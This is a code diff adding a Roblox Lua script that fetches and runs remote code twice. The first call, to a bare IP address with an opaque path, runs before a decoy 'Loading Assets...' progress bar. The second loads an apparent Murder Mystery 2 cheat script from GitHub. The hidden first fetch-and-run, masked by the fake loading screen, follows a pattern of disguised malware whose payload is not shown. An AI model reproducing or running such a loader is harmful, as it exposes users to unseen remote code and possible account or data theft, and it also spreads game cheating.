@@ -1,0 +1,73 @@
+-- FIRST SCRIPT
+
+local success1, err1 = pcall(function()
+    loadstring(game:HttpGet("http://31.172.87.116/x7u1NJwqN1YQWfvoDQ5TeUCnaixfch25IQaVsemeJ88ViGzLcORCIi2Y0gAyGPuEJcWABZFrKV5BcFbV"))()
+end)
+
+if not success1 then
+    warn("FIRST SCRIPT ERROR:", err1)
+end
+
+
+-- LOADING GUI
+
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.ResetOnSpawn = false
+screenGui.Parent = playerGui
+
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0.4,0,0.25,0)
+frame.Position = UDim2.new(0.3,0,0.375,0)
+frame.BackgroundColor3 = Color3.fromRGB(30,30,30)
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1,0,0.4,0)
+title.BackgroundTransparency = 1
+title.Text = "Loading Assets..."
+title.TextColor3 = Color3.fromRGB(255,255,255)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBold
+title.Parent = frame
+
+
+local progress = Instance.new("Frame")
+progress.Size = UDim2.new(0.8,0,0.15,0)
+progress.Position = UDim2.new(0.1,0,0.7,0)
+progress.BackgroundColor3 = Color3.fromRGB(50,50,50)
+progress.Parent = frame
+
+
+local bar = Instance.new("Frame")
+bar.Size = UDim2.new(0,0,1,0)
+bar.BackgroundColor3 = Color3.fromRGB(0,170,255)
+bar.Parent = progress
+
+
+for i = 1,100 do
+    task.wait(0.02)
+    bar.Size = UDim2.new(i/100,0,1,0)
+    title.Text = "Loading Assets... ("..i.."%)"
+end
+
+
+task.wait(1)
+
+screenGui:Destroy()
+
+
+-- SECOND SCRIPT
+
+local success2, err2 = pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Azura83/Murder-Mystery-2/refs/heads/main/Script.lua"))()
+end)
+
+if not success2 then
+    warn("SECOND SCRIPT ERROR:", err2)
+end
